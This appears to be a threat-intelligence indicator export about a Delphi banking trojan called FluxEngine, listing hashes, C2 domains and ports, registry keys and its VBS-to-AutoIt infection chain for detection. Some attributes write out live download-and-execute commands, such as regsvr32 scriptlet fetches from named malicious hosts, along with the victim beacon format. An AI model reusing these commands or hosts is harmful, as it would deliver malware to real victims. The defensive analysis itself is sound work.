Event.info: FluxEngine, a live Delphi remote-access banker: full chain VBS -> scriptlets -> AutoIt -> dhlib.dll (panel remoto.painelst.com, Cloudflare-API TXT dead drop)

Attribute.comment: FluxEngine client (payload): Delphi PE32 GUI, 4,540,928 B, compiled 2026-11-17 00:02:55 UTC, version info poses as Microsoft Edge. The delivered binary, i.e. the plaintext of d3dx9_43.bin after the loader's own AES-256 decryption, reproduced from two separate downloads. MD5 18a54b1573f23ccfb996536fb3e8d1f9, SHA-1 1c6e5656d306c700503b0ec4ec3486719c79237e [type: sha256; verdict: malicious; source: static analysis and decryption (this case); ThreatFox 2034982; MalwareBazaar; VirusTotal]

Same download/decrypt/hollow logic and the same embedded master key in all four builds [type: sha256; verdict: malicious; source: static analysis (this case); ThreatFox 2034978; MalwareBazaar; VirusTotal]

Stage-1 LNK (2,171 B): cmd /V:ON, copies scrobj.dll into an alternate data stream of a %TEMP% .log, then regsvr32 /i:<url> /u /s on the stream (Squiblydoo). Read from the bytes. Link to the FluxEngine loader is by shared infrastructure only (not hash-proven); the scriptlet it fetches was not obtained [type: sha256; verdict: malicious; source: static analysis (this case); MalwareBazaar; ThreatFox 2034984]

Previous FluxEngine client build (7hfobg.exe, 4,540,416 B, compile 2026-11-10). Known only from VirusTotal data (bytes not in hand): same registry key, mutex and Cloudflare-API lookups in the 2026-11-12 sandbox run; VT: Kaspersky HEUR:Trojan-Banker.Win32.Agent.gen, ESET Win32/Spy.Delf.RCE [type: sha256; verdict: malicious; source: VirusTotal behaviour and file report; ThreatFox 2034983]

FluxEngine operator panel ('Operador - Login'), UrlSource and payload host: /api/source-file.php returns the encrypted payload container, /template/source/<id>/<lang> the mail template, /registrar.php the victim beacon. A record 72.167.150.114 (DoH 2026-11-19). HTTP 200 in urlscan scans on 2026-11-02, 11-10, 11-11, 11-17 [type: domain; verdict: malicious; source: urlscan; payload retrieved twice through an anonymising network; VirusTotal behaviour; ThreatFox 2034971]

Registrable domain of the panel: registered 2026-08-27 (Dynadot), Cloudflare name servers. ip.painelst.com is only a Cloudflare-proxied address with no TXT record, i.e. not the dead-drop zone [type: domain; verdict: malicious; source: RDAP; DoH (2026-11-19)]

Zone name used as the Cloudflare-API dead drop in the VirusTotal sandbox run of 2026-11-12 (TXT ip.<zone> = C2 IP, TXT lurlsource.<zone> = UrlSource). A lookup key inside a Cloudflare account, not a contacted host; NXDOMAIN in public DNS and RDAP 404 on 2026-11-19, so the dead drop works without public DNS [type: domain; verdict: malicious; source: VirusTotal behaviour; DoH/RDAP; ThreatFox 2034976]

Stage host in the lure LNK: regsvr32 /i:https://nota-fical-online.lat/d/<id> scriptlet URL. Read from the LNK bytes; NXDOMAIN on 2026-11-19, scriptlet not obtained. Link to the FluxEngine loader is by shared infrastructure only [type: domain; verdict: malicious; source: static analysis (this case); ThreatFox 2034977]

Panel origin since 2026-11-17 (GoDaddy, AS398101). TCP 443, 22, 9000 and 9002 open on 2026-11-19 on third-party check-host nodes (5 per port; 9000 from IR, RU, SI, US and 9002 from IR, IT, PT); the controls 9001 and 31337 were refused (one node timed out on 31337). Never contacted by us [type: ipv4; verdict: malicious; source: DoH; urlscan; check-host (bare TCP via third-party nodes)]

Earlier panel origin (moved to 72.167.150.114 between 2026-11-13 and 2026-11-17). Opened by the previous payload build on TCP 9000 in the VirusTotal sandbox run of 2026-11-12. Passive evidence only, liveness not checked [type: ipv4; verdict: malicious; source: VirusTotal behaviour]

Also contacted on TCP 9000 in the same VirusTotal sandbox run. Role unverified (second C2 or an unrelated host): context, not submitted to ThreatFox [type: ipv4; verdict: candidate; source: VirusTotal behaviour]

FluxEngine control channel (JSON events, PING/PONG). The client reads the C2 IP from a DNS TXT record, so the IP is not embedded; the panel host listens here (check-host 2026-11-19) [type: endpoint; verdict: malicious; source: static analysis + check-host; ThreatFox 2034973]
FluxEngine data and video channel (H.264 via Media Foundation, or JPEG) [type: endpoint; verdict: malicious; source: static analysis + check-host; ThreatFox 2034974]
Previous C2 endpoint of the 2026-11-12 build (see 72.167.47.112) [type: endpoint; verdict: malicious; source: VirusTotal behaviour; ThreatFox 2034975]
Seen in the same sandbox run, role unverified [type: endpoint; verdict: candidate; source: VirusTotal behaviour]

Encrypted payload container. The panel re-encrypts it per download (fresh session key and IV), so container hashes are worthless as indicators; two downloads decrypt to the same payload c424a715...e8c6 [type: url; verdict: malicious; source: payload retrieved twice through an anonymising network; ThreatFox 2034972]
Mail template fetched by the payload for the Outlook/Thunderbird contact resend; id 3A14 in two payload builds [type: url; verdict: malicious; source: static analysis; VirusTotal behaviour]

Mail-template path of the payload (/template/source/<id>/<lang>) [type: url-path; verdict: malicious; source: static analysis (this case)]
Resend log POST of the contact-resend module [type: url-path; verdict: malicious; source: static analysis (this case)]

Victim beacon of loader and payload: status=<installed|...>&pc=<COMPUTERNAME>&user=<USERNAME>[&motivo=dll_vm|dll_sandbox|dll_erro_modulos|dll_erro_injecao] [type: url-path; verdict: malicious; source: static analysis (this case)]

Encrypted overlay HTML pulled from GitHub; owner, repository and token are pushed by the C2 at run time, so the repository is not known statically (not published). Hunt on the pattern, never block the host [type: behaviour; verdict: hunting-pivot; source: static analysis (this case)]

Dead drop: legitimate Cloudflare API used from a non-browser Delphi process with an embedded Bearer token (not published). Hunt on the process and the two lookups, never block api.cloudflare.com [type: behaviour; verdict: hunting-pivot; source: static analysis; VirusTotal behaviour]
Default Delphi THTTPClient user agent seen on the Cloudflare API calls in the sandbox run; generic, hunting pivot only [type: user-agent; verdict: hunting-pivot; source: VirusTotal behaviour]
JSON event framing on the TCP 9000 control channel [type: string; verdict: malicious; source: static analysis (this case)]

Internal family name. Loader value 'src' (UrlSource override); payload values pd_*/pe_* (PROTEGER_CASA domain lists) and state [type: registry-key; verdict: malicious; source: static analysis (this case)]
Cached UrlSource, masquerades as HWiNFO [type: registry-key; verdict: malicious; source: static analysis (this case)]
Toast-notification identity of the payload (KL Remota naming) [type: registry-key; verdict: malicious; source: static analysis; VirusTotal behaviour]
Payload state keys; purpose not fully traced [type: registry-key; verdict: malicious; source: static analysis (this case)]

Loader persistence: value named from COMPUTERNAME+USERNAME, data '"C:\<n>\<n>.exe C:\<n>\"'. Only written if that EXE already exists; the host EXE is not in hand [type: registry-key; verdict: hunting-pivot; source: static analysis (this case)]
Payload single-instance mutex (project name 'misge'); seen in the VirusTotal sandbox run, not read from the code [type: mutex; verdict: malicious; source: VirusTotal behaviour]

Payload host process: a suspended attrib.exe that later talks to the network, with a regsvr32 or loader-host parent. attrib.exe itself is genuine: never block it [type: process; verdict: hunting-pivot; source: static analysis (this case)]
PowerShell WinRT helper for fake Windows toasts (path inferred from strings); kl_toast_icon.png next to it [type: file-path; verdict: malicious; source: static analysis (this case)]

Genuine libjpeg-turbo fetched from the panel for JPEG streaming: benign alone, context only, do NOT block on it [type: file-path; verdict: shared-or-legit-infrastructure; source: static analysis; payload retrieval]

Stage 1 VBS DOC-9CQC87.vbs (3,653 B): Msxml2.ServerXMLHTTP GET of https://doc.pdf-unico.lat/d/abpod6?r=330767F45595 with UA 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)', saves %TEMP%\t481799.sct and runs regsvr32 /s /n /u /i:<sct> scrobj.dll. Listed on MalwareBazaar 2026-11-21 with tag mispadu, a mislabel: the chain is FluxEngine (correction comment added 2026-11-22). MD5 edcbd5d4880ef969c822fb96b70afe6b [type: sha256; verdict: malicious; source: static analysis (this case, part 2); MalwareBazaar]

Stage 2 recon scriptlet (JScript COM scriptlet, 4,357 B) from /d/abpod6: XOR string table, WMI VM/BIOS/AV checks, analyst PC-name blocklist, beacon registrar.php?dominio=..., then saves %TEMP%\<8 base36>.sct (stage 3) and runs it with regsvr32. progid/classid look per-serve, so the hash may be per download. MalwareBazaar accepted the upload but does not list plain-text scripts [type: sha256; verdict: malicious; source: static analysis (this case, part 2)]

Stage 3 installer scriptlet (4,852 B) from /d/inewqrh: ClearMyTracksByProcess 8, HKCU\Software\FluxEngine\Desktop values src and taskm, 8-letter install name from COMPUTERNAME+USERNAME, unzips AutoIt3 + compiled script + icon into C:\<n>\, starts C:\<n>\<n>.exe C:\<n>\<n>, attrib +h +s. Hash may be per download; not listed by MalwareBazaar (plain text) [type: sha256; verdict: malicious; source: static analysis (this case, part 2)]

Stage 4 compiled AutoIt script (AU3!EA06, 1,881,241 B, dropped without extension as C:\<n>\<n>): maps the hex-embedded dhlib.dll c3dc0485 with its own in-memory PE loader and calls InitModule(C:\<n>\); beacons au3_inicio/au3_dll_ok/au3_init_ok. On MalwareBazaar inside a2.zip 305b8da6 (the raw file is not listed) [type: sha256; verdict: malicious; source: static analysis and decompilation (this case, part 2)]

a2.zip served at /d/mo1t6do6?f=a3x (holds the compiled script 4fc99727). Built per request, so likely per victim. MD5 714034b6639f7f0f3af1a5c6e172d430 [type: sha256; verdict: malicious; source: stage retrieval (this case, part 2); MalwareBazaar]

Same AES master key and Cloudflare API token as the four Sep/Oct builds (compared by hash).
